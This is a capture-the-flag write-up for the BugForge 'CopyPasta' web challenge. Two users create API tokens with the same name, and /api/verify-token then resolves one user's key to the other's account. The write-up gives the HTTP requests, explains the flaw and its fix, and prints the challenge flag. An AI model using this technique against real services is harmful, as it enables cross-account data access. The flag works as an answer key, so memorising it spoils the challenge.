# CopyPasta — copypasta-008 — BugForge Challenge Write-up?

## Challenge

**Name:** CopyPasta
**Platform:** BugForge
**Category:** Web Security
**Hint:**

> What if Jeremy and Jessamy have the same token name?

---

## 1. Register the Users

The challenge involves two users:

* `jeremy`
* `jessamy`

Register both accounts through:

```http
POST /api/register
```

Example Jeremy registration:

```json
{
  "username": "jeremy",
  "email": "jeremy@mail.com",
  "password": "jeremy",
  "full_name": "Jeremy"
}
```

The server returns a JWT identifying Jeremy as user ID `5`.

Example:

```json
{
  "token": "<JEREMY_JWT>",
  "user": {
    "id": 5,
    "username": "jeremy",
    "email": "jeremy@mail.com",
    "full_name": "Jeremy",
    "role": "user"
  }
}
```

Register/login as Jessamy as well. Jessamy is assigned user ID `6`.

---

## 2. Discover the API Token Feature

Navigate to:

```text
Profile → Account Settings → API Keys
```

The page states:

> Personal tokens for programmatic access. Send them in the `X-API-Key` request header.

The API endpoint used to create a token is:

```http
POST /api/tokens
```

The request accepts a token name:

```json
{
  "name": "sametokenname"
}
```

---

## 3. Create an API Token for Jeremy

While authenticated as Jeremy, create a token named:

```text
sametokenname
```

The server returns:

```json
{
  "id": 2,
  "name": "sametokenname",
  "token": "<JEREMY'S-TOKEN>",
  "token_prefix": "<JEREMY'S-TOKEN-PREFIX>",
  "message": "API token created. Copy it now — it will not be shown again."
}
```

The important values are:

```text
User: Jeremy
Token name: sametokenname
API key: <JEREMY'S-TOKEN>
```

---

## 4. Create the Same-Named Token for Jessamy

Open a separate session/tab and log in as Jessamy.

Navigate to:

```text
Profile → Account Settings → API Keys
```

Create another token using the **exact same name**:

```text
sametokenname
```

The server accepts it and returns:

```json
{
  "id": 3,
  "name": "sametokenname",
  "token": "<JESSAMY'S-TOKEN>",
  "token_prefix": "<JESSAMY'S-TOKEN-PREFIX>"
}
```

We now have:

```text
Jeremy
└── sametokenname
    └── <JEREMY'S-TOKEN>

Jessamy
└── sametokenname
    └── <JESSAMY'S-TOKEN>
```

This satisfies the challenge hint.

---

## 5. Discover `/api/verify-token`

Inspecting the application's JavaScript (`main.js`) reveals an endpoint:

```http
GET /api/verify-token
```

The application uses the `X-API-Key` header to provide the API token.

A normal request looks like:

```http
GET /api/verify-token
X-API-Key: <API_KEY>
```

---

## 6. Test the API Token

Use Burp Suite to intercept or modify a request to:

```http
GET /api/verify-token
```

Initially, test with the API key belonging to Jessamy while keeping Jeremy's JWT authentication:

```http
Authorization: Bearer <JEREMY_JWT>
X-API-Key: <JESSAMY'S-TOKEN>
```

The server returns Jessamy's information:

```json
{
  "user": {
    "id": 6,
    "username": "jessamy",
    "email": "jessamy@mail.com",
    "full_name": "Jessamy",
    "bio": null,
    "role": "user"
  }
}
```

This shows that `/api/verify-token` resolves the API key independently of the JWT identity.

---

## 7. Trigger the Vulnerability

Now replace the API key with **Jeremy's actual API key**:

```http
GET /api/verify-token
Authorization: Bearer <JEREMY_JWT>
X-API-Key: <JEREMY'S-TOKEN>
```

The surprising response is:

```json
{
  "user": {
    "id": 6,
    "username": "jessamy",
    "email": "jessamy@mail.com",
    "full_name": "Jessamy",
    "bio": null,
    "role": "user"
  },
  "flag": "bug{fh5NlxqKXYbLrQEv2ia7O0RWe8prR7Ug}"
}
```

Even though the supplied API key belongs to Jeremy, the endpoint resolves the request to Jessamy.

---

## 8. Vulnerability Explanation

The vulnerability is caused by an **API token name collision / improper token-to-user association**.

Token names are not globally unique:

```text
Jeremy → sametokenname
Jessamy → sametokenname
```

However, the backend appears to use the token's **name** during the process of resolving the token to its associated user.

Conceptually, the vulnerable lookup behaves like:

```text
API key
   ↓
Token record
   ↓
Token name
   ↓
User lookup by token name
   ↓
Wrong user
```

Instead of uniquely associating the API key with its own token record and owner.

Because both users have the same token name, Jeremy's token can ultimately resolve to Jessamy's token/user record.

### Expected behavior

The API key should uniquely identify its token:

```text
Jeremy API key
      ↓
Jeremy token record
      ↓
Jeremy user
```

### Actual behavior

Because the token name is reused:

```text
Jeremy API key
      ↓
Token name: sametokenname
      ↓
Ambiguous token lookup
      ↓
Jessamy token record
      ↓
Jessamy user
```

---

## 9. Impact

An attacker who can create or influence API-token names may be able to cause a valid API token to resolve to another user's token record.

This can result in:

* Incorrect user identification
* Cross-account information disclosure
* Unauthorized access to resources associated with another user
* Exposure of challenge-sensitive information

In this challenge, the incorrect association exposes the flag.

---

## 10. Flag

```text
bug{fh5NlxqKXYbLrQEv2ia7O0RWe8prR7Ug}
```

---

## 11. Key Takeaway

The important clue was the hint:

> **What if Jeremy and Jessamy have the same token name?**

The solution was not to forge the JWT or crack the API key.

Instead:

1. Create an API token for Jeremy.
2. Create another API token for Jessamy using the **same name**.
3. Discover `/api/verify-token`.
4. Send Jeremy's legitimate API key to the endpoint.
5. Observe that the backend associates it with Jessamy.
6. Retrieve the flag from the incorrect user association.

This demonstrates the importance of using **unique token identifiers or the token's cryptographically random secret itself** when associating an API token with its owner, rather than relying on a user-controlled, non-unique token name.